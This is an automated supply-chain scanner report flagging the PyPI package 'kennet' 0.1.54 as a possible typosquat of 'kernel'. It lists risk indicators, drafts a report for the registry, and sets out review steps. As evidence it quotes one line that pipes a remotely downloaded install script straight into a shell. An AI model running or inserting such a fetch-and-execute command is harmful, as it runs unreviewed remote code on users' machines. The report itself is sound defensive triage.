# Suspicious package report: `kennet` 0.1.54 (pypi)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `kennet` |
| Version | `0.1.54` |
| Ecosystem | pypi |
| Risk score | 71 / 100 (high) |
| Published | 2026-11-15T16:48:09Z |
| Scanned | 2026-11-15T22:45:36Z |
| Registry page | https://pypi.org/project/kennet/0.1.54/ |
| Possibly imitating | `kernel` |

## Indicators

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `metaphi/update.py`:

  ```text
  INSTALL_SH = f"curl -fsSL https://github.com/{REPO}/releases/latest/download/install.sh | sh"
  ```

- **new-publisher-similar-name** (medium, +20): Recently created package from a publisher with little history, with a name similar to popular package 'kernel'.
- **typosquat** (low, +12): Name is 2 edit(s) from popular package 'kernel' (two edits apart).
- **sparse-metadata** (info, +4): Missing or placeholder repository URL.

## Suggested text for an upstream report

The pypi package `kennet` version `0.1.54` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code downloads a file and then executes it or marks it executable.
- Recently created package from a publisher with little history, with a name similar to popular package 'kernel'.
- Name is 2 edit(s) from popular package 'kernel' (two edits apart).
- Missing or placeholder repository URL.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via the "Report project as malware" link on the project page, or security@pypi.org.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20pypi%2Fkennet%400.1.54&package=pypi%2Fkennet%400.1.54
